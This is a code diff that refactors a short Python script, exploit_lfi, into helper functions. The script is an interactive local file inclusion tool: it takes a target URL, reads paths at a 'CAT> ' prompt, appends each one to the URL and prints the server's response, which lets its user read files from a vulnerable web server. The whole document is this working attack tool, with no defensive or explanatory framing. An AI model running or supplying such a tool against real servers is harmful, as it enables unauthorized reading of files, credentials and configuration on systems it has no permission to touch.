@@ -7,6 +7,11 @@ import os
 def clear_screen():
     os.system('cls' if os.name == 'nt' else 'clear')
 
+def send_request(url, command):
+    full_url = f'{url}/{command}'
+    response = requests.get(full_url)
+    return response.text
+
 def exploit_lfi(url):
     while True:
         command = input('CAT> ')
@@ -15,11 +20,10 @@ def exploit_lfi(url):
         elif command.lower() == 'clear':
             os.system('clear')
             continue
-        full_url = f'{url}/{command}'
-        response = requests.get(full_url)
-        print(response.text)
+        response = send_request(url, command)
+        print(response)
 
 if __name__ == '__main__':
-    os.system('clear')
+    clear_screen()
     url = sys.argv[1]
     exploit_lfi(url)
